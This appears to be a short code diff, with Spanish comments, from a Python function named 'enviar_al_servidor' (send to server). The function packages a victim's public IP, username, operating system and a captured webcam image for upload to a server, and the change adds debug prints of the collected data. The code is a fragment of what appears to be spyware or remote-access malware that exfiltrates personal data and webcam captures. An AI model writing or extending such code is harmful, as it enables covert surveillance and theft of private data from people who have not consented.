@@ -1,6 +1,12 @@
 def enviar_al_servidor(info, archivos):
     try:
-        print("[*] Info a enviar:", json.dumps(info, indent=2))
+        # Depuración para ver qué tiene el diccionario info
+        print("[*] Info a enviar:")
+        print(f"IP Pública: {info['ip_publica']}")
+        print(f"Usuario: {info['usuario']}")
+        print(f"Sistema: {info['sistema']}")
+        print(f"Info completa: {json.dumps(info, indent=2)}")
+        
         with open(archivos["webcam"], "rb") as img:
             files = {
                 "image": img,
